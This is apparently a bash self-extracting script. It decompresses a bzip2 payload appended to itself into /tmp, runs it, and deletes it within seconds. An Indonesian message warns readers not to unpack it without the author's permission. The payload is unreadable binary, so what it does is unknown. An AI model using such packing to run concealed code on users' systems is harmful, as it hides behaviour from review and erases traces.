#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY%H��  �_�E����?o߮����    @Ζڔi ��F���&�4�M�L�i��� ɦCi1=�j��0�= i�4��C@ ���44���@@1# H���MO�z�"zL��h�42b44`�Tf<Y��e�ԆP�=��ZE!cJh~�f\�fgh�+�
@*��6Mzl>��L�,|�Ռ�JXq�C PA3E�sL�v'�T���Q;je���)�!�dA�`{5A=��lOm��u��:x(�KU-8�q�-�[y��b�w���gI44��@d��@�ACh�\��.B�F3�dK�7��2"y�x� ˶*��L��������7J��YqV	{�r�M �~�Ě��g�x#4-NH�h������PI��ԈYXk���FM�v�1����̓5��H�D�$LH�ը!�EO�#���պd���T�����3i-A��$3��_�1�[���j��4���̎4$%7����5�'Y����(��vQ;�Z���y
��#�k�ʌ�cNw��;�)�+���3 ���������@*���C��s*f̂�0�f��кts(+�h�a#�$��iI��T�[�~�z��� �M�e�R2�)�1�l4.�R���%�+�^�3F6���ba�v��Z\�ASE�U���s	u_�ǷU�P�Iz�5شlNv�D�b�l
<�y��g%��qMtr�#��|���@+D񆒚����\1J�
8��PC&��� #JeZ�\��ǥ�!n[jV[Y�p¯�-��)�;?�I/�K֐�����H�
�x�